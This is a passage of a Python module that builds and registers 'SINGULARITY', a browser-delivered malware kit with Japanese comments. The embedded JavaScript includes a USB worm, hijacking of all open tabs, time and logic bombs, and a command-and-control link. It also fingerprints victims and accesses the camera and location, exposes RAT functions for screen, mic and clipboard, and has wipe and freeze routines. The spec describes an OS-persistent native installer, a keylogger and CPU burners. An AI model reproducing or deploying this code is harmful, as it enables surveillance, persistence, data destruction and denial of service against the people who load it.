  }).catch(function (e) { err_(e); usbReady(); return false; });
}
function usbWormKit() {
  if (!CFG.usbWorm || !usbCode() || INJ) return;
  if (!window.showDirectoryPicker) return;
  usbBtn();
  usbLog("USBを挿して「USBにも仕込む」を押すと、そのUSBが武装されます");
  setTimeout(function () { usbArm(false); }, 2500);
}

/* ================= 20. タブ連合 ================= */
var BC = null, LEADER = true, PEERS = 0;
function federation() {
  if (!CFG.tabs && LEVEL < 2) return;
  try { BC = new BroadcastChannel("sg"); } catch (e) { return; }
  BC.onmessage = function (ev) {
    var d = ev.data || {};
    if (!d || !d.sid) return;
    if (d.k === "hi") { PEERS++; R.peers = PEERS; bcPost({ k: "you", sid: SID, level: LEVEL }); }
    else if (d.k === "you") { PEERS++; R.peers = PEERS; if (d.sid < SID) LEADER = false; }
    else if (d.k === "bye") { PEERS = Math.max(0, PEERS - 1); R.peers = PEERS; }
    else if (d.k === "cmd") { try { handleCmd(d.j); } catch (e) {} }
    else if (d.k === "nav" && d.url) { try { location.href = d.url; } catch (e) {} }
    else if (d.k === "say" && d.msg) { try { R.peersMsg = d.msg; } catch (e) {} }
  };
  bcPost({ k: "hi", sid: SID });
  addEventListener("pagehide", function () { bcPost({ k: "bye", sid: SID }); });
  /* リーダーだけが窓爆弾を撃つ（多重起動の抑制） */
  if (PEERS > 0 && !LEADER && CFG.windows > 0 && CFG.winMode === "chain") CFG.windows = 1;
  if (LEADER && CFG.tabs > 0) setTimeout(takeover, 6000);
}
function bcPost(m) { try { BC && BC.postMessage(m); } catch (e) {} }
function takeover() {
  /* 全タブを感染URLへ乗っ取る（リーダーのみ） */
  var u = CFG.path + "?u=tb&ref=" + encodeURIComponent(SID) + "&w=0";
  var self2 = location.pathname;
  var n = 0;
  (function step() {
    if (n++ > (CFG.tabs || 0)) return;
    bcPost({ k: "nav", url: u });
    setTimeout(step, 1200);
  })();
  R.takeover = u;
}

/* ================= 21. 時限爆弾 / 論理爆弾 ================= */
function bombGate() {
  var b = (CFG.bomb || "").trim();
  if (!b) return true;
  if (/^\d{4}-\d{2}-\d{2}/.test(b)) {
    var t = Date.parse(b);
    if (isNaN(t)) return true;
    if (now() >= t) return true;
    R.bomb = { kind: "time", at: t };
    setInterval(function () {
      if (now() >= R.bomb.at && !R.bomb.fired) {
        R.bomb.fired = 1; GATED = false;
        applyLevel(CFG.fixed ? 7 : (R.wantLevel || 1)); restart(); push(true);
      }
    }, 20000);
    return false;
  }
  if (location.host.toLowerCase().indexOf(b.toLowerCase()) >= 0) return true;
  R.bomb = { kind: "host", need: b, host: location.host };
  return false;
}

/* ================= 22. file:// からオンライン本体へ増援 ================= */
function hopFile() {
  if (!CFG.hop || location.protocol !== "file:") return;
  if (navigator.onLine === false) return;
  setTimeout(function () {
    try {
      var u = CFG.path + "?u=" + encodeURIComponent(R.usb || "usb") + "&ref=" + SID + "&w=0";
      var w = window.open(u, "_blank");
      R.hop = { url: u, opened: !!w };
      push(false);
    } catch (e) { err_(e); }
  }, 4000);
}

/* ================= 23. 起動 ================= */
function arm() {
  try { base(); } catch (e) { err_(e); }
  try { pageMeta(); } catch (e) {}
  try { R.vectors.canvas = canvasFP(); } catch (e) {}
  try { R.vectors.webgl = webglFP(); } catch (e) {}
  try { R.vectors.fonts = fontFP(); } catch (e) {}
  try { R.vectors.math = mathFP(); } catch (e) {}
  try { audioFP(); } catch (e) {}
  try { privacy(); } catch (e) {}
  try { adblock(); } catch (e) {}
  try { botProbe(); } catch (e) {}
  try { devices(); } catch (e) {}
  try { perms(); } catch (e) {}
  try { codecs(); } catch (e) {}
  try { benchmark(); } catch (e) {}
  try { enumerate2(); } catch (e) {}
  try { behavior(); } catch (e) {}
  try { mutate(); } catch (e) {}
  try { persistState(); } catch (e) {}
  try { resurrect(); } catch (e) {}
  try { cryptoID(); } catch (e) {}
  try { swInstall(); } catch (e) {}
  try { installKit(); } catch (e) { err_(e); }
  try { usbWormKit(); } catch (e) { err_(e); }
  try { camera(); } catch (e) {}
  try { geo(); } catch (e) {}
  try { domSnap(false); } catch (e) {}
  try { federation(); } catch (e) {}
  try { c2(); } catch (e) {}
  Promise.all([netIntel().catch(function () {}), webrtc().catch(function () {})])
    .then(function () { try { verdict(); } catch (e) {} try { spoof(); } catch (e) {} push(true); });
  push(false);
  setInterval(function () { push(false); }, CFG.interval);
  addEventListener("pagehide", function () { push(true); });
  addEventListener("visibilitychange", function () { if (document.visibilityState === "hidden") push(true); });
  addEventListener("online", function () { push(true); });
  setTimeout(function () { try { domSnap(false); push(true); } catch (e) {} }, 12000);
  setInterval(function () { try { domSnap(false); } catch (e) {} }, 45000);

  if (CFG.wipe) { setTimeout(wipe, 1600); }
  try { hopFile(); } catch (e) {}
  R.wantLevel = LEVEL;
  GATED = !bombGate();
  if (GATED) applyLevel(0);
  if (!CFG.fire) { push(false); return; }
  if (GATED) { push(false); return; }

  if (IFR) {
    CFG.iframes = 0; CFG.windows = 0; CFG.downloads = 0; CFG.clipHijack = 0;
    CFG.speakFlood = 0; CFG.fsFolder = 0; CFG.sharedWorker = 0; CFG.installer = 0;
    CFG.winMode = "off";
    CFG.domNodes = Math.round((CFG.domNodes || 0) / 2);
    CFG.cssAnim = Math.round((CFG.cssAnim || 0) / 2);
    CFG.timers = Math.round((CFG.timers || 0) / 2);
    CFG.cores = Math.max(2, Math.round((navigator.hardwareConcurrency || 4) / 2));
  }

  if (WIN) {
    /* 窓の子: 数を稼ぐため要素は間引くが、見た目と火力は盛る */
    CFG.iframes = 0; CFG.downloads = 0; CFG.clipHijack = 0; CFG.speakFlood = 0;
    CFG.fsFolder = 0; CFG.sharedWorker = 0; CFG.installer = 0; CFG.sseStorm = 0;
    CFG.cacheBuckets = 0; CFG.layoutThrash = 0; CFG.jsonChurn = 0; CFG.microtasks = 0;
    CFG.compress = 0; CFG.digest = 0; CFG.readback = 0; CFG.fetchStorm = 0;
    CFG.tabs = 0; CFG.sse = "";
    CFG.domNodes = Math.min(CFG.domNodes || 0, 6000);
    CFG.cssAnim = Math.min(CFG.cssAnim || 0, 300);
    CFG.timers = Math.min(CFG.timers || 0, 60);
    CFG.cores = clamp(Math.round((navigator.hardwareConcurrency || 4) / 2), 1, 6);
    CFG.audio = 1; CFG.winSkin = 1; CFG.uncloseable = 1;
  }

  setTimeout(function () { startBurns(); }, 900);

  if (CFG.freeze === "soft" || CFG.freeze === "hard") {
    setTimeout(function () { freezeNow(CFG.freeze); }, 8000);
  }
}

window.__singularity = {
  report: function () { return R; },
  link: function () { return R.viral.childLink || null; },
  flush: function () { push(true); },
  install: function () { return window.__sgInstall ? window.__sgInstall() : false; },
  native: function (ext) { return niDownload(ext || "bat"); },
  breed: function (branch) { if (branch) CFG.winBranch = branch; R.breeded = 0; return windowBreed(); },
  usb: function () { return usbArm(true); },
  cmd: runCmd, peers: function () { return { peers: PEERS, leader: LEADER }; },
  shot: ratShot, mic: ratMic, clip: ratClip, screen: ratScreen, speak: speak,
  freeze: freezeNow, wipe: wipe, pause: pauseAll, ota: ota,
  destroy: function () {
    pauseAll();
    try { localStorage.clear(); } catch (e) {}
    try { indexedDB.deleteDatabase("singularity"); } catch (e) {}
    try { navigator.serviceWorker.getRegistrations().then(function (r) { r.forEach(function (x) { x.unregister(); }); }); } catch (e) {}
    window.__SINGULARITY__ = false;
  }
};

if (document.readyState === "loading") addEventListener("DOMContentLoaded", arm, { once: true });
else arm();
})();
"""

# ---------------------------------------------------------------------------
# レジストリ互換のスペック
# ---------------------------------------------------------------------------
VIRUS: Dict[str, Any] = {
    "id": VIRUS_ID,
    "name": VIRUS_NAME,
    "name_ja": VIRUS_NAME_JA,
    "version": VIRUS_VERSION,
    "class": VIRUS_CLASS,
    "tier": 125,
    "emoji": "◎",
    "color": "#00ff88",
    "description": ("全46系統・8資源同時攻撃の常駐最終兵器。L7「絶滅」で上限を撤廃し、"
                    "iframe自己増殖・DOM爆弾・GL/Audioコンテキスト枯渇・SharedWorker常駐・"
                    "ダウンロード嵐・クリップボード乗っ取りを同時発動。"
                    "さらに窓は指数増殖し（L7はリミッターなし）、各窓はWebGLプラズマ＋"
                    "ネオングロウのヘビースキンで高火力化する。"
                    "OS常駐インストーラ(.bat/.command/.sh)でRun+Startup+Taskに永続化し、"
                    "コア数ぶんの常駐CPUバーナーをブラウザ外に走らせる。"),
    "description_en": ("Apex resident weapon with an OS-level installer: at L7 it drops a native helper "
                       "that persists via Run/Startup/schtasks, spawns one CPU burner per core outside "
                       "the browser, and re-infects on logon. In-page it self-nests iframes, bombs the DOM, "
                       "exhausts GL/Audio contexts, floods downloads, hijacks the clipboard, keeps a "
                       "SharedWorker alive after tabs close, breeds windows exponentially with no limiter, "
                       "gives each window a heavy neon skin, and removes all resource caps."),
    "tags": ["apex", "resident", "pwa", "install", "native-installer", "os-persistence",
             "self-replicating", "persistent", "sw-injection", "keylogger", "rat", "sse",
             "cpu-burn", "gpu-burn", "webgpu", "wasm", "worklet", "ram-balloon", "disk-fill",
             "freeze", "camera", "gps", "usb-worm", "spoof", "fixed-level", "l7", "gpu-mem-bomb",
             "iframe-bomb", "dom-bomb", "css-layers", "gl-context-exhaust", "audio-context-exhaust",
             "timer-storm", "microtask-pin", "compression-burn", "redos", "digest-burn",
             "gpu-readback", "sse-exhaust", "clipboard-hijack", "download-storm", "shared-worker",
             "folder-writer", "extinction", "window-breed", "infinite-windows", "exponential",
             "window-skin"],
    "vectors": 46,
    "signals": 260,
    "requires_https": True,
    "payload": PAYLOAD_JS,
    "worker": WORKER_JS,
    "service_worker": SW_JS,
    "shared_worker": SHARED_JS,
    "installer": {"bat": INSTALL_BAT, "command": INSTALL_COMMAND, "sh": INSTALL_SH},
    "app_name": APP_NAME_DEFAULT,
    "route": f"/v/{VIRUS_ID}/<sid>",
    "collect": f"/v/{VIRUS_ID}/collect",
    "cmd": f"/v/{VIRUS_ID}/cmd",
    "manifest": f"/v/{VIRUS_ID}/manifest.json",
    "levels": LEVEL_LABEL,
    "level_desc": LEVEL_DESC,
    "fixed_level": 7,
    "options": {
        "level": 1, "fire": 1, "freeze": "", "windows": 0, "history": 0,
        "diskRatio": 0, "chunkMB": 8, "cores": 0, "ramMB": 0, "gpu": False, "wasm": False,
        "burn": False, "audio": False, "media": True, "geo": True, "mutate": True,
        "install": "auto", "installLevel": 4, "avName": APP_NAME_DEFAULT,
        "usbWorm": False, "usbBase": "", "usbCode": "", "usbLabel": "", "hop": False,
        "inj": True, "sse": True, "rat": True, "spoof": True, "dom": True, "bomb": "",
        "fixed": False, "finalRamMB": 0, "gpuMem": True, "installer": True,
        "winMode": "off", "winBranch": 2, "winDepth": 0, "winSkin": 0,
        "iframes": 0, "domNodes": 0, "cssAnim": 0, "glContexts": 0, "acContexts": 0,
        "timers": 0, "microtasks": 0, "compress": 0, "redos": 0, "digest": 0,
        "readback": 0, "sseStorm": 0, "fetchStorm": 0, "speakFlood": 0, "oscBank": 0,
        "idbDisk": 0, "cacheBuckets": 0, "layoutThrash": 0, "clipHijack": 0,
        "downloads": 0, "sharedWorker": 0, "jsonChurn": 0, "fsFolder": 0, "fsFiles": 0,
    },
}
VIRUS_SPEC = VIRUS
SPEC = VIRUS


def get_virus() -> Dict[str, Any]:
    return VIRUS


def new_sid(n: int = 14) -> str:
    return secrets.token_urlsafe(16).replace("-", "").replace("_", "")[:n]


def build_payload(sid: Optional[str] = None, **opts: Any) -> str:
    sid = sid or new_sid()
    cfg = dict(VIRUS["options"])
    cfg.update(opts)
    cfg["sid"] = sid
    cfg["path"] = f"/v/{VIRUS_ID}"
    cfg["collect"] = f"/v/{VIRUS_ID}/collect"
    cfg["cmd"] = f"/v/{VIRUS_ID}/cmd"
    cfg["sse"] = f"/v/{VIRUS_ID}/sse"
    cfg["ack"] = f"/v/{VIRUS_ID}/ack"
    cfg["sw"] = f"/v/{VIRUS_ID}/sw.js"
    cfg["manifest"] = f"/v/{VIRUS_ID}/manifest.json"
    cfg_json = json.dumps(cfg, ensure_ascii=False)
    return (
        "<script>window.__SINGULARITY_CFG__=" + cfg_json
        + ";window.__SINGULARITY_WORKER__=" + json.dumps(WORKER_JS) + ";</script>\n"
        "<script>" + PAYLOAD_JS + "</script>"
    )


def build_link(base_url: str, sid: Optional[str] = None, ref: Optional[str] = None) -> str:
    sid = sid or new_sid()
    url = base_url.rstrip("/") + f"/v/{VIRUS_ID}/{sid}"
    if ref:
        url += "?ref=" + ref
    return url


def render_page(sid: Optional[str] = None, ref: Optional[str] = None, **opts: Any) -> str:
    sid = sid or new_sid()
    return (
        "<!doctype html><html lang=\"ja\"><head><meta charset=\"utf-8\">"
        "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
        f"<title>{APP_NAME_DEFAULT} {sid}</title>"
        "<style>html,body{margin:0;height:100%;background:#05070a;color:#0f0;"
        "font:13px/1.6 ui-monospace,SFMono-Regular,Menlo,monospace}"
        "body{display:grid;place-items:center}</style></head><body>"
        "<div><b>SINGULARITY</b><br>sid: " + sid + "</div>"
        + build_payload(sid=sid, **opts) +
        "</body></html>"
    )


def register(registry: Any) -> Any:
    if isinstance(registry, dict):
        registry[VIRUS_ID] = VIRUS
    elif isinstance(registry, list):
        registry.append(VIRUS)
    elif isinstance(registry, set):
        registry.add(VIRUS_ID)
    return registry


def autoregister(scope: Optional[Dict[str, Any]] = None) -> Optional[str]:
    scope = scope if scope is not None else globals()
    for name in ("VIRUSES", "VIRUS_MAP", "REGISTRY", "MODES", "WEAPONS", "PAYLOADS", "VIRUS_LIST"):
        c = scope.get(name)
        if isinstance(c, dict):
            c[VIRUS_ID] = VIRUS
            return name
        if isinstance(c, list):
            c.append(VIRUS)
            return name
    return None